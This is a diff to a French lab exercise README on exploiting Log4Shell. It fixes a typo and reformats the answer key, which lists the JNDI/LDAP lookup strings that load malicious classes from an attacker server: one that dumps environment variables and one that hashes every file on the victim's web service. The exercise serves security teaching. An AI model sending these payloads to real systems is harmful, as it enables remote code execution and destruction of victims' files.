@@ -50,11 +50,14 @@ Maintenant que vous avez réussi à afficher les variables d'environnements de v
 Pour ce faire, vous allez devoir recréer une classe qui va cette fois récupérer les fichiers du serveur de la victime, et les hasher avec l'algorithme SHA-256.
 
 Pour vous aidez:
-- la classe `MessageDigest` permet de faire su hashage, plus qu'à savoir comment...
+- la classe `MessageDigest` permet de faire du hashage, plus qu'à savoir comment...
 - N'oubliez pas de modifier votre lookup en fonction de votre nouvelle classe ;p
 
 Pour vérifier que cette attaque a bien marché, vous devriez voir que tous les fichiers du web service de la victime ont été hashés. Si c'est le cas, bravo vous êtes un pirate !! 
 
 # POUR LA CORRECTION : 
 les classes malicieuses sont EnvVariable.java pour l'exercice 0, et Encryptor.java pour l'exercice 1.
-Les loopkups sont du coup : ${jndi:ldap://ip_server_1:9999/EnvVariable} pour l'exo 0 et ${jndi:ldap://ip_server_1:9999/Encryptor}
+Les loopkups sont du coup : 
+```
+${jndi:ldap://ip_server_1:9999/EnvVariable} pour l'exo 0 et ${jndi:ldap://ip_server_1:9999/Encryptor} pour l'exo 1
+```
